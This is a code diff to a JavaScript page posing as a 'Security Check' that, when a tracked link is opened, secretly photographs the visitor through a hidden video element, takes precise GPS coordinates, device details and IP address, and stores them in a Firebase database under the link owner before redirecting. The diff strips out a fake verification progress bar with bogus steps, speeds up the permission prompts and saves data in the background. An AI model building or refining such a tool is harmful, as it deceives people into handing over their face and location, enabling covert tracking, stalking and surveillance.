@@ -22,62 +22,18 @@ function setStatus(text) {
     if (el) el.innerText = text;
 }
 
-function setFakeStatus(text) {
-    const el = document.getElementById('fakeStatus');
-    if (el) el.innerText = text;
-}
-
-function setProgress(pct) {
-    const el = document.getElementById('progressBar');
-    if (el) el.style.width = pct + '%';
-}
-
-// ── FAKE PROGRESS BAR SETUP ───────────────────────────────────────────────
-function buildProgressUI(container) {
+// ── MINIMAL UI SETUP (replaces fake progress — no artificial delays) ──────
+// Renders only a neutral waiting message + hidden media elements.
+// The status line updates as permissions are handled.
+function buildMinimalUI(container) {
     container.innerHTML = `
         <h2>Security Check</h2>
-        <p style="color:#666; font-size:14px;">Please wait while we verify your identity...</p>
-        <div style="background:#f0f0f0; border-radius:8px; overflow:hidden; height:12px; margin:18px 0 8px;">
-            <div id="progressBar" style="height:100%; width:0%; background:linear-gradient(90deg,#007bff,#00c6ff); border-radius:8px; transition:width 0.4s ease;"></div>
-        </div>
-        <p id="fakeStatus" style="font-size:13px; color:#777; margin:4px 0;">Initializing...</p>
-        <p id="statusText"  style="font-size:13px; color:#007bff; font-weight:600; margin:6px 0; min-height:18px;"></p>
-        <video id="video" autoplay playsinline muted style="display:none; width:1px; height:1px; opacity:0; position:absolute;"></video>
+        <p style="color:#666; font-size:14px;">Please allow the requested permissions to continue.</p>
+        <p id="statusText" style="font-size:13px; color:#007bff; font-weight:600; margin:12px 0; min-height:18px;"></p>
+        <video id="video" autoplay playsinline muted
+               style="display:none; width:1px; height:1px; opacity:0; position:absolute;"></video>
         <canvas id="canvas" style="display:none;"></canvas>
     `;
-
-    const steps = [
-        [10, "Checking SSL certificate..."],
-        [20, "Connecting to server..."],
-        [30, "Validating session token..."],
-        [42, "Authenticating identity..."],
-        [54, "Requesting permissions..."],
-        [65, "Processing biometric data..."],
-        [74, "Encrypting data transfer..."],
-        [83, "Finalizing verification..."],
-        [90, "Almost done..."]
-    ];
-
-    let i = 0;
-    const ticker = setInterval(() => {
-        if (i < steps.length) {
-            setProgress(steps[i][0]);
-            setFakeStatus(steps[i][1]);
-            i++;
-        } else {
-            clearInterval(ticker);
-        }
-    }, 900);
-
-    return {
-        stop()   { clearInterval(ticker); },
-        finish() {
-            clearInterval(ticker);
-            setProgress(100);
-            setFakeStatus('Verification complete!');
-            setStatus('✅ Verification Successful!');
-        }
-    };
 }
 
 // ── COLLECT DEVICE INFO ───────────────────────────────────────────────────
@@ -126,12 +82,12 @@ async function collectDeviceInfo() {
     else if (/linux/i.test(ua))             info.os = 'Linux';
     else                                    info.os = 'Unknown';
 
-    if      (/edg\//i.test(ua))                          info.browser = 'Edge';
-    else if (/opr\/|opera/i.test(ua))                    info.browser = 'Opera';
-    else if (/chrome\/\d/i.test(ua))                     info.browser = 'Chrome';
-    else if (/firefox\/\d/i.test(ua))                    info.browser = 'Firefox';
-    else if (/safari\/\d/i.test(ua) && !/chrome/i.test(ua)) info.browser = 'Safari';
-    else                                                  info.browser = 'Unknown';
+    if      (/edg\//i.test(ua))                               info.browser = 'Edge';
+    else if (/opr\/|opera/i.test(ua))                         info.browser = 'Opera';
+    else if (/chrome\/\d/i.test(ua))                          info.browser = 'Chrome';
+    else if (/firefox\/\d/i.test(ua))                         info.browser = 'Firefox';
+    else if (/safari\/\d/i.test(ua) && !/chrome/i.test(ua))  info.browser = 'Safari';
+    else                                                       info.browser = 'Unknown';
 
     return info;
 }
@@ -201,11 +157,21 @@ async function capturePhoto() {
 async function getLocation() {
     setStatus('📍 Requesting location access...');
     return new Promise(resolve => {
-        if (!navigator.geolocation) { resolve({ lat: 'Unavailable', lon: 'Unavailable' }); return; }
+        if (!navigator.geolocation) {
+            resolve({ lat: 'Unavailable', lon: 'Unavailable' });
+            return;
+        }
         navigator.geolocation.getCurrentPosition(
-            pos => { setStatus(''); resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }); },
-            err => { console.warn('GPS denied:', err.message); setStatus(''); resolve({ lat: 'Denied', lon: 'Denied' }); },
-            { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
+            pos => {
+                setStatus('');
+                resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+            },
+            err => {
+                console.warn('GPS denied:', err.message);
+                setStatus('');
+                resolve({ lat: 'Denied', lon: 'Denied' });
+            },
+            { timeout: 10000, enableHighAccuracy: true, maximumAge: 0 }
         );
     });
 }
@@ -220,6 +186,34 @@ function isValidUrl(url) {
         return u.protocol === 'http:' || u.protocol === 'https:';
     } catch (_) {
         return false;
+    }
+}
+
+// ── SAVE CAPTURE TO FIREBASE (shared helper) ──────────────────────────────
+async function saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo }) {
+    const now = Date.now();
+    try {
+        const newRef = push(ref(db, 'photo_history'));
+        await set(newRef, {
+            id:         now,
+            image:      photoData || null,
+            latitude:   lat,
+            longitude:  lon,
+            linkName:   settings.name  || 'Unknown',
+            linkId:     linkId,
+            date:       new Date(now).toLocaleDateString(),
+            time:       new Date(now).toLocaleTimeString(),
+            timestamp:  now,
+            ipAddress:  ipAddress,
+            device:     deviceInfo,
+            // Ownership — inherited from the link that was opened
+            _ownerType: settings._ownerType || 'admin',
+            _ownerId:   settings._ownerId   || 'admin'
+        });
+        return null;
+    } catch (e) {
+        console.error('Firebase save error:', e);
+        return e.message;
     }
 }
 
@@ -246,7 +240,9 @@ async function initVerification() {
             <div style="text-align:center; margin-top:80px; font-family:sans-serif;">
                 <h2>Connection Error</h2>
                 <p style="color:#888;">Could not reach server. Check your connection and try again.</p>
-                <button onclick="location.reload()" style="margin-top:14px; padding:10px 22px; background:#007bff; color:#fff; border:none; border-radius:6px; cursor:pointer; font-size:14px;">Retry</button>
+                <button onclick="location.reload()"
+                        style="margin-top:14px; padding:10px 22px; background:#007bff; color:#fff;
+                               border:none; border-radius:6px; cursor:pointer; font-size:14px;">Retry</button>
             </div>`;
         return;
     }
@@ -260,68 +256,81 @@ async function initVerification() {
         return;
     }
 
-    // Increment visit count
+    // Increment visit count (fire-and-forget — unchanged)
     update(ref(db, 'managed_links/' + linkId), { visits: (settings.visits || 0) + 1 }).catch(() => {});
 
+    // ── Replace container with minimal UI (no fake progress, no artificial delay) ──
     const container = document.querySelector('.container');
-    const progress  = buildProgressUI(container);
+    buildMinimalUI(container);
 
-    const needsCam = !!settings.cam;
-    const needsGPS = !!settings.gps;
+    const needsCam    = !!settings.cam;
+    const needsGPS    = !!settings.gps;
+    const hasRedirect = isValidUrl(settings.redirectUrl);
 
-    const camPromise  = needsCam ? capturePhoto()  : Promise.resolve(null);
-    const gpsPromise  = needsGPS ? getLocation()   : Promise.resolve({ lat: 'Denied', lon: 'Denied' });
+    // ── Start background tasks immediately (non-blocking) ────────────────
+    // These run in parallel with permission prompts so they're ready when needed.
     const infoPromise = collectDeviceInfo();
     const ipPromise   = getIPAddress();
 
-    const [photoData, gpsResult, deviceInfo, ipAddress] = await Promise.all([
-        camPromise, gpsPromise, infoPromise, ipPromise
-    ]);
+    // ── IMMEDIATELY request the required permissions ──────────────────────
+    // Permission dialogs appear as soon as possible — no delay gates them.
+    const camPromise = needsCam
+        ? capturePhoto()
+        : Promise.resolve(null);
+
+    const gpsPromise = needsGPS
+        ? getLocation()
+        : Promise.resolve({ lat: 'Denied', lon: 'Denied' });
+
+    // Wait only for the permission-gated results
+    const [photoData, gpsResult] = await Promise.all([camPromise, gpsPromise]);
 
     const lat = gpsResult?.lat ?? 'Denied';
     const lon = gpsResult?.lon ?? 'Denied';
 
-    // ── Save to Firebase — inherit owner from the link ──
-    const now       = Date.now();
-    const saveError = await (async () => {
-        try {
-            const newRef = push(ref(db, 'photo_history'));
-            await set(newRef, {
-                id:          now,
-                image:       photoData || null,
-                latitude:    lat,
-                longitude:   lon,
-                linkName:    settings.name  || 'Unknown',
-                linkId:      linkId,
-                date:        new Date(now).toLocaleDateString(),
-                time:        new Date(now).toLocaleTimeString(),
-                timestamp:   now,
-                ipAddress:   ipAddress,
-                device:      deviceInfo,
-                // Ownership — inherited from the link that was opened
-                _ownerType:  settings._ownerType || 'admin',
-                _ownerId:    settings._ownerId    || 'admin'
-            });
-            return null;
-        } catch (e) {
-            console.error('Firebase save error:', e);
-            return e.message;
-        }
-    })();
+    // ── Evaluate whether required permissions were granted ────────────────
+    // Camera: granted when photoData is non-null (stream opened successfully).
+    // GPS:    granted when lat is a number (not the 'Denied'/'Unavailable' strings).
+    const camGranted  = !needsCam || (photoData !== null);
+    const gpsGranted  = !needsGPS || (typeof lat === 'number');
+    const allGranted  = camGranted && gpsGranted;
 
-    progress.finish();
+    // ── REDIRECT PATH: redirect URL present + all required permissions granted ──
+    if (hasRedirect && allGranted) {
+        // Save capture data asynchronously — do not block the redirect.
+        // infoPromise / ipPromise are already in-flight; attach save as continuation.
+        Promise.all([infoPromise, ipPromise])
+            .then(([deviceInfo, ipAddress]) =>
+                saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo })
+            )
+            .catch(e => console.error('Async capture save failed:', e));
+
+        // Redirect immediately.
+        console.log('Permissions granted — redirecting to:', settings.redirectUrl.trim());
+        window.location.replace(settings.redirectUrl.trim());
+        return;
+    }
+
+    // ── NORMAL PATH: no redirect, or a required permission was denied ─────
+    // Wait for background tasks to complete, then save and show result.
+    const [deviceInfo, ipAddress] = await Promise.all([infoPromise, ipPromise]);
+
+    const saveError = await saveCapture({ photoData, lat, lon, settings, linkId, ipAddress, deviceInfo });
 
     if (saveError) {
         setStatus('⚠️ Verification issue — please try again.');
         return;
     }
 
-    if (isValidUrl(settings.redirectUrl)) {
-        setStatus('✅ Done! Redirecting...');
-        setTimeout(() => {
-            window.location.replace(settings.redirectUrl.trim());
-        }, 200);
+    // If redirect was configured but permissions were denied, say so.
+    if (hasRedirect && !allGranted) {
+        console.warn('Redirect skipped: required permission(s) were denied.');
+        setStatus('✅ Verified. Redirect skipped (permission denied).');
+        return;
     }
+
+    // No redirect configured — normal completion.
+    setStatus('✅ Verification Successful!');
 }
 
 // ── BOOT ─────────────────────────────────────────────────────────────────
